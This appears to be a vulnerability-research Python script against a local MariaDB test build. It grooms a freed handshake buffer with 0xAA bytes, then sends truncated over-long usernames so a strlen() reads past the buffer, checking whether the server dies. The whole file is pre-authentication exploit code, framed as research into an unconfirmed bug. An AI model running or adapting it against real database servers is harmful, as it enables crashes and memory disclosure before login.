#!/usr/bin/env python3
"""Does the previous connection's net->buff become the next one's?

create_thd()/my_net_init() allocate a fresh net->buff per connection and
net_end() frees the old one, so on a stock allocator the next connection of the
same size is likely handed the same chunk back, contents and all. If so, a
connection that fills the buffer with non-zero bytes grooms the tail that the
NOTES 4.25 strlen() then walks -- which is the step I could not demonstrate.

Run the server with MARIADB_PREAUTH_STOCK=1 (no fixes, no poisoning) and
ASAN_OPTIONS=quarantine_size_mb=0:thread_local_quarantine_size_kb=0 so freed
chunks are reused immediately, the way glibc does and ASAN by default does not.
"""
import sys
sys.path.insert(0, "/home/user/mariadb/research/zdc2026")
from mariadb_preauth import (Conn, server_alive, BASE_CAPS, CLIENT_PROTOCOL_41,
    CLIENT_SECURE_CONNECTION, CLIENT_CONNECT_WITH_DB, CLIENT_PLUGIN_AUTH,
    CLIENT_CONNECT_ATTRS, CLIENT_MYSQL)

HOST, PORT = "127.0.0.1", 3307
FILL_LEN = int(sys.argv[1]) if len(sys.argv) > 1 else 16384
SCAN_LEN = int(sys.argv[2]) if len(sys.argv) > 2 else 16384
PAIRS    = int(sys.argv[3]) if len(sys.argv) > 3 else 60
FILL     = 0xAA

def fill_conn(n):
    """Write n non-zero bytes across net->buff, then drop the connection."""
    c = Conn(HOST, PORT, timeout=20.0)
    if c.read_greeting() is None:
        c.close(); return
    caps = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~CLIENT_MYSQL
    pkt = c.build_handshake_response(caps=caps, charset=45, user=b"u",
                                     raw_tail=bytes([FILL]) * n)
    try:
        c.send_packet(pkt); c.read_packet()
    except OSError:
        pass
    c.close()

def scan_conn(total):
    """Username runs to the final byte, so passwd lands past the terminator and
    the !CLIENT_SECURE_CONNECTION strlen() walks whatever follows."""
    c = Conn(HOST, PORT, timeout=20.0)
    if c.read_greeting() is None:
        c.close(); return True
    caps = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~(
        CLIENT_SECURE_CONNECTION | CLIENT_CONNECT_WITH_DB |
        CLIENT_PLUGIN_AUTH | CLIENT_CONNECT_ATTRS | CLIENT_MYSQL)
    pkt = c.build_handshake_response(caps=caps, charset=45,
                                     user=b"u" * (total - 32), truncate=total)
    try:
        c.send_packet(pkt); c.read_packet()
    except OSError:
        c.close(); return server_alive(HOST, PORT, 10.0)
    c.close(); return True

if not server_alive(HOST, PORT, 20.0):
    print("server not reachable"); sys.exit(2)
print(f"fill={FILL_LEN} scan={SCAN_LEN} pairs={PAIRS} fill_byte=0x{FILL:02x}")
for i in range(1, PAIRS + 1):
    fill_conn(FILL_LEN)
    if not scan_conn(SCAN_LEN):
        print(f"  pair {i}: SERVER DIED"); sys.exit(1)
print(f"  {PAIRS} pairs, server survived")
